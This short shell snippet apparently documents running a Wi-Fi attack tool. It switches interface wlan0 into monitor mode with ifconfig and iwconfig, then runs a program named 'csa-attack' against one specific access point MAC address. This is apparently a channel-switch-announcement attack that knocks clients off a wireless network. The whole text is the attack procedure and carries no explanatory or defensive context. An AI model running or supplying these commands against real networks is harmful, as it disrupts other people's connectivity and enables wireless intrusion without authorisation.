sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

sudo ./csa-attack wlan0 BC:62:CE:F7:BB:DA